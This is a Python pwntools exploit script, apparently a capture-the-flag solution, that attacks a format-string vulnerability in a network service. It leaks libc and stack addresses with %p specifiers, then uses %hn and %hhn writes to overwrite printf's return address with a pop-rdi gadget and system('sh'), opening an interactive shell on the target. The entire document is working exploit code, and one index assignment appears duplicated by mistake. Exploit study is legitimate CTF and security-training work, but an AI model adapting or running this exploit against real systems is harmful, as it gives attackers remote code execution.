from pwn import *

context.arch = 'amd64'

# host = 'csie.ctf.tw'
# port = 10136
host = '127.0.0.1'
port = 8888
r = remote(host, port)

local = True if host == '127.0.0.1' else False

if local: input('Press Enter to continue.')

idx_libc_csu_init = 8
idx_libc_start_main_240 = 9
idx_and_argv = 11
idx_argv = idx_and_argv + 0xd*2

__libc_start_main_off = 0x0000000000020740
system_off = 0x0000000000045390
execve_off = 0x00000000000cc770

# leak memory & stack address
r.recvuntil(':')
payload = '%' + str(idx_libc_start_main_240) + '$p'
payload += '%' + str(idx_and_argv) + '$p'
payload += '%' + str(idx_libc_csu_init) + '$p'
payload += 'x'
payload = payload.encode()
r.sendline(payload)

# leak libc address
r.recvuntil('0x')
__libc_start_main_240 = int(r.recvuntil('0x')[:-2], 16)
__libc_start_main = __libc_start_main_240 - 240
libc = __libc_start_main - __libc_start_main_off

# calculate system address
system = system_off + libc
execve = execve_off + libc
print('system        =', hex(system))
print('execve        =', hex(execve))

# leak argv address on stack
argv = int(r.recvuntil('0x')[:-2], 16)
print('argv          =', hex(argv))

# calculate iter on stack
iter_i = argv - (0x7fff9bf081b8 - 0x7fff9bf080c8) + 4
vfprintf_ret = argv + 0x7ffd77a08cf8 - 0x7ffd77a08ed8
printf_ret = vfprintf_ret + 0x7ffc71bca058 - 0x7ffc71bc9f78
print('iter_i        =', hex(iter_i))
print('printf_ret    =', hex(printf_ret))

# leak buf address
__libc_csu_init = int(r.recvuntil('x')[:-1], 16)
pop_rdi = __libc_csu_init + 99
buf = __libc_csu_init + (0x555555755020 - 0x555555554a80)
print('pop_rdi       =', hex(pop_rdi))
print('buf           =', hex(buf))

# leak argv_0 address
payload = '%' + str(idx_argv) + '$p'
payload = payload.encode().ljust(0x10, b'z')
r.recvuntil(':')
r.send(payload)
argv_0 = int(r.recvuntil('z')[:-1], 16)

# pick argv_1 ~ 2
argv_1 = argv_0 + 0x8
argv_2 = argv_0 + 0x10
idx_argv_0 = idx_argv+(argv_0 - argv)//0x8
idx_argv_1 = idx_argv_0 + 1
idx_argv_1 = idx_argv_0+2
print('argv_0        =', hex(argv_0))
print('argv_1        =', hex(argv_1))
print('argv_2        =', hex(argv_2))


def fmt(prev, val, idx, byte):
    if byte == 1:
        prev &= 0xff
        full = 0x100
        hn_hnn = '$hhn'
    elif byte == 2:
        prev &= 0xffff
        full = 0x10000
        hn_hnn = '$hn'
    ret = ''
    if val > prev:
        ret = '%' + str(val - prev) + 'c'
    elif val < prev:
        ret = '%' + str(full + val - prev) + 'c'
    ret += '%' + str(idx) + hn_hnn
    return ret.encode()

def fmt_recvn(prev, val, byte):
    if byte == 1:
        prev &= 0xff
        full = 0x100
    elif byte == 2:
        prev &= 0xffff
        full = 0x10000
    if val > prev:
        ret = val - prev
    elif val < prev:
        ret = full + val - prev
    return ret

def fmt_send_recv(val, idx, byte):
    payload = fmt(0, val, idx, byte)
    if len(payload) < 0x10:
        payload = payload.ljust(0x10, b'\x00')
    r.recvuntil(':')
    r.send(payload)
    r.recvn(val)

def fmt_make_new_addr(stack_addr, addr):
    """Make a new address on stack_addr."""
    global idx_argv
    global idx_and_argv

    fmt_send_recv(stack_addr & 0xff, idx_and_argv, 1)
    fmt_send_recv(addr & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x2) & 0xff, idx_and_argv, 1)
    fmt_send_recv((addr>>0x10) & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x4) & 0xff, idx_and_argv, 1)
    fmt_send_recv((addr>>0x20) & 0xffff, idx_argv, 2)

    fmt_send_recv((stack_addr+0x6) & 0xff, idx_and_argv, 1)
    fmt_send_recv(0x10000, idx_argv, 2)

    fmt_send_recv(stack_addr & 0xff, idx_and_argv, 1)

# make more loop
# TODO: make this more robust by overwriting more bytes
if local: input('Make more loop.')
fmt_send_recv(iter_i&0xffff, idx_and_argv, 2)
fmt_send_recv(0xffff, idx_argv, 2)

fmt_send_recv(argv_0&0xffff, idx_and_argv, 2)

def fmt_write_to_addr(val, addr):
    global idx_argv_0

    fmt_make_new_addr(argv_0, addr)
    fmt_send_recv(val & 0xff, idx_argv_0, 1)

    for i in range(1, 8):
        fmt_send_recv((addr+i) & 0xff, idx_argv, 1)
        fmt_send_recv((val>>(0x8*i)) & 0xff, idx_argv_0, 1)

if local: input('Write "/bin/sh".')
fmt_write_to_addr(argv_2, printf_ret+0x8)

if local: input('Write system.')
fmt_write_to_addr(system, printf_ret+0x10)

# create final_payload
final_payload = fmt(0, pop_rdi&0xffff, idx_argv_0, 2)
final_payload += fmt(pop_rdi&0xff, (system>>4*0x8)&0xff, idx_argv_1, 1)
final_payload += b'\x00'
print(len(final_payload))   # len = 26 = 0x1a
print(final_payload)

if local: input('Write payload to buf+0x10.')
fmt_write_to_addr(u64(final_payload[0x10:0x18]), buf+0x10)
fmt_send_recv((buf+0x18) & 0xff, idx_argv, 1)
fmt_send_recv(u64(final_payload[0x18:].ljust(8, b'\x00')) & 0xff, idx_argv_0, 1)

if local: input('Write addresses to argv[0] ~ argv[2].')
fmt_make_new_addr(argv_0, printf_ret)
fmt_make_new_addr(argv_1, printf_ret+0x10+4)
# fmt_make_new_addr(argv_2, u64(b'/bin/sh\x00'))
fmt_make_new_addr(argv_2, u64(b'sh'.ljust(8, b'\x00')))

if local: input('Send final_payload.')
r.send(final_payload[:0x10])

# receive a lot of blank
final_recvn = fmt_recvn(0, pop_rdi&0xffff, 2)
final_recvn += fmt_recvn(pop_rdi&0xff, system&0xff, 1)
r.recvn(final_recvn)

r.interactive()
